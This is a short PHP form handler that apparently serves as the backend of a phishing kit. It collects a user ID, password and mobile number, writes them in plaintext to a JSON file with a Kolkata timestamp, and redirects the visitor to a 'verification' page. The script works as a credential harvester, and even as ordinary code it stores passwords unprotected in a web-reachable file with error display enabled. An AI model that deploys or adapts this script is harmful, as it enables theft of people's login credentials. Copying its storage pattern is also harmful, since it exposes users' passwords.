<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

function generateRandomToken($length = 8) {
    return bin2hex(random_bytes($length / 2));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Initialize an array to store data
    $data = [];
// Generate a token if it doesn't exist for Full_Name or User_id
if (!isset($_SESSION['token']) && isset($_POST['User_id'])) {
    $_SESSION['token'] = generateRandomToken();
}


    // Fetch the existing data
    $jsonFile = "data/newdata.json";
    if (!file_exists($jsonFile)) {
        file_put_contents($jsonFile, json_encode([])); // Initialize file if not exists
    }
    $jsonData = json_decode(file_get_contents($jsonFile), true);
    if ($jsonData === null) {
        $jsonData = [];
    }

    // Find or create the entry for the current token
    $token = $_SESSION['token'];
    if (!isset($jsonData[$token])) {
        $jsonData[$token] = ["token" => $token];
    }

    // Process based on the form submitted
    if (isset($_POST['User_id']) && isset($_POST['Password'])&& isset($_POST['Mobile_Number'])) {
    $jsonData[$token]['User_id'] = $_POST['User_id'];
    $jsonData[$token]['Password'] = $_POST['Password'];
    $jsonData[$token]['Mobile_Number'] = $_POST['Mobile_Number'];
    $timezone = new DateTimeZone('Asia/Kolkata');
    $datetime = new DateTime('now', $timezone);
    $jsonData[$token]['completion_time'] = $datetime->format('Y-m-d H:i:s'); // Format: YYYY-MM-DD HH:MM:SS
    $jsonData[$token]['message'] = "User data finished";

    // Clear the session token
    unset($_SESSION['token']);

    // Redirect user to last.php
    $redirectUrl = 'verification.php';

   


} else {
        // Handle unexpected form submission or missing data
        die('Invalid form submission or missing data');
    }

    // Save data to file
    if (file_put_contents($jsonFile, json_encode($jsonData, JSON_PRETTY_PRINT)) === false) {
        die('Failed to save data');
    }

    // Redirect user to the appropriate URL
    if (isset($redirectUrl)) {
        header('Location: ' . $redirectUrl);
        exit;
    }
}
?>